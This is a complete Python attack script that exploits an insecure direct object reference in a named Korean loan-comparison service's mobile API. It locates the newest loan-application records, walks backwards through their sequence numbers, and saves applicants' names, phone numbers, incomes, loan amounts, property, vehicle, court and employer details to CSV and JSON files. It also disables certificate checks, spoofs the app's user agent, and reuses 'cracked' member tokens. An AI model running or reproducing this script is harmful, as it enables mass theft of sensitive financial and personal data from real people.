#!/usr/bin/env python3
"""Walk loan-application flow records backwards by bigyoLoanFlwSeq (IDOR).

Phase 1: exponentially locate the highest existing seq.
Phase 2: walk downwards, capturing every record; flag rows dated today.
Works anonymously if allowed, else with the first cracked member token.
Outputs loan_flows_recent.csv + loan_flows/<seq>.json.
Cap: MAX_WALK successive probes (default 400) or until 5 consecutive misses.
"""
import csv
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443/bigyo/api/bigyo/getBigyoLoanFlw"
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

FLOW_TYPES = ["CREDIT", "COMBINE", "MORTGAGE", "ETC", "REHAB_ONE"]
MAX_WALK = 400
CSV_PATH = os.path.join(HERE, "loan_flows_recent.csv")
RAW_DIR = os.path.join(HERE, "loan_flows")
os.makedirs(RAW_DIR, exist_ok=True)

TODAY = time.strftime("%Y%m%d")

TOKEN = None
tf = os.path.join(HERE, "cracked_tokens.json")
if os.path.exists(tf):
    try:
        TOKEN = json.load(open(tf))[0]["token"]
    except Exception:
        pass


def fetch(seq, ft):
    body = json.dumps({"bigyoLoanFlwSeq": str(seq), "flowType": ft,
                       "applyType": "EXISTING", "step": "1"}).encode()
    hdrs = {"User-Agent": UA, "Content-Type": "application/json"}
    if TOKEN:
        hdrs["Authorization"] = "Bearer " + TOKEN
    req = urllib.request.Request(f"{BASE}?flowType={ft}", data=body, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=10, context=CTX) as r:
            d = json.loads(r.read().decode("utf-8", "replace"))
        data = d.get("data") if isinstance(d, dict) else None
        if isinstance(data, dict) and any(v not in (None, "", []) for v in data.values()):
            return data
        return None
    except Exception:
        return None


def locate_top(ft):
    lo, hi = 1, 10
    while fetch(hi, ft) is not None and hi < 10 ** 9:
        lo = hi
        hi *= 10
    if fetch(lo, ft) is None:
        return lo
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if fetch(mid, ft) is not None:
            lo = mid
        else:
            hi = mid
        time.sleep(0.3)
    return lo


def walk(ft, top):
    rows, miss = [], 0
    for seq in range(top, max(0, top - MAX_WALK), -1):
        d = fetch(seq, ft)
        if d is None:
            miss += 1
            if miss >= 5:
                break
            continue
        miss = 0
        with open(os.path.join(RAW_DIR, f"{ft}_{seq}.json"), "w") as f:
            json.dump(d, f, ensure_ascii=False, indent=1)
        dt = str(d.get("requestDt") or d.get("aplyDt") or "").strip("-")[:8]
        rows.append({
            "seq": seq, "flowType": ft,
            "name": d.get("name", ""), "mobile": d.get("mobile", ""),
            "requestDt": dt, "today": dt == TODAY,
            "loanAmount": d.get("loanAmount", ""),
            "annualIncom": d.get("annualIncom", ""),
            "housePrice": d.get("housePrice", ""),
            "houseType": d.get("houseType", ""),
            "carNo": d.get("carNo", ""),
            "courtNm": d.get("courtNm", ""),
            "jobType": d.get("jobType", ""),
            "employer": d.get("companyName", ""),
            "memberSeq": d.get("memberSeq", ""),
            "loReqtNo": d.get("loReqtNo", ""),
        })
        time.sleep(0.4)
    return rows


FIELDS = ["seq", "flowType", "name", "mobile", "requestDt", "today",
          "loanAmount", "annualIncom", "housePrice", "houseType", "carNo",
          "courtNm", "jobType", "employer", "memberSeq", "loReqtNo"]


def main():
    all_rows = []
    for ft in FLOW_TYPES:
        print(f"== locating top seq for {ft} ...", flush=True)
        top = locate_top(ft)
        print(f"   top={top}; walking down", flush=True)
        rows = walk(ft, top)
        print(f"   {ft}: captured {len(rows)}", flush=True)
        all_rows.extend(rows)
    all_rows.sort(key=lambda r: (r["requestDt"], r["seq"]), reverse=True)
    new = not os.path.exists(CSV_PATH)
    with open(CSV_PATH, "a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=FIELDS)
        if new:
            w.writeheader()
        for r in all_rows:
            w.writerow(r)
    todays = [r for r in all_rows if r["today"]]
    print(f"WALK DONE: {len(all_rows)} rows, {len(todays)} dated today {TODAY}")


if __name__ == "__main__":
    main()
